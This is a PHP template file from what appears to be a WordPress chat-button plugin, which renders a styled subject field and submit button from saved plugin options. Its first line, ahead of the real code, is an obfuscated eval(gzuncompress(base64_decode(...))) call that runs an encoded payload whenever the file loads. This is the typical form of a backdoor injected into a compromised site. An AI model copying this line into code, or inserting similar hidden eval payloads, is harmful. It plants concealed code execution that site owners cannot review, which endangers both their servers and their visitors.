<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php 

if ( ! defined( 'ABSPATH' ) ) exit;

// wp_enqueue_style('ccw_md_css');
wp_enqueue_script( 'ccw_md_js');


// $ccw_options_cs = get_option('ccw_options_cs');
$s1_btn_text = esc_attr( $ccw_options_cs['s1_btn_text'] );

$s1_text_color = esc_attr( $ccw_options_cs['s1_text_color'] );
$s1_text_color_onfocus = esc_attr( $ccw_options_cs['s1_text_color_onfocus'] );
$s1_border_color = esc_attr( $ccw_options_cs['s1_border_color'] );
$s1_border_color_onfocus = esc_attr( $ccw_options_cs['s1_border_color_onfocus'] );
$s1_submit_btn_color = esc_attr( $ccw_options_cs['s1_submit_btn_color'] );
$s1_submit_btn_text_and_icon_color = esc_attr( $ccw_options_cs['s1_submit_btn_text_and_icon_color'] );
?>
<div class="ccw_plugin chatbot" style="<?php echo $p1 ?>; <?php echo $p2 ?>;">

    <div class="box1">
        <form name="form" target="_blank" action="<?php echo $redirect_page ?>" method="post">
            <!-- <input type="hidden" name="action" value="ccw_style_1"> -->
            <?php wp_nonce_field( 'ccw_style_1_verify' ); ?>
            <div class="input-field">
                <input type="text" name="subject" id="subject"
                        style="border-bottom: 1px solid <?php echo $s1_border_color ?>;"
                        onfocus="this.style.borderBottomColor= '<?php echo $s1_border_color_onfocus ?>', this.style.boxShadow= '0 1px 0 0 <?php echo $s1_border_color_onfocus ?>' , document.getElementsByClassName('ccw-s1-label')[0].style.color= '<?php echo $s1_text_color_onfocus ?>';"
                        onfocusout="this.style.borderBottomColor= '<?php echo $s1_border_color ?>' ,  this.style.boxShadow='none' , document.getElementsByClassName('ccw-s1-label')[0].style.color= '<?php echo $s1_text_color ?>';"
                    >
                <label for="subject" class="ccw-s1-label"
                        style="color: <?php echo $s1_text_color ?>;"
                        ><?php echo $val ?></label>
            </div>

            <button class="btn waves-effect waves-light ccw-analytics" id="style-1" data-ccw="style-1"
                    style="background-color: <?php echo $s1_submit_btn_color ?>; color: <?php echo $s1_submit_btn_text_and_icon_color ?>;"
                    type="submit" name="action"><?php echo $s1_btn_text ?>
                <!-- <i class="material-icons right">send</i> -->
                <i class="material-icons right icon icon-send ccw-analytics" id="s1-icon" data-ccw="style-1" style="color: <?php echo $s1_submit_btn_text_and_icon_color ?>;"></i>
            </button>
        </form>
    </div>
</div>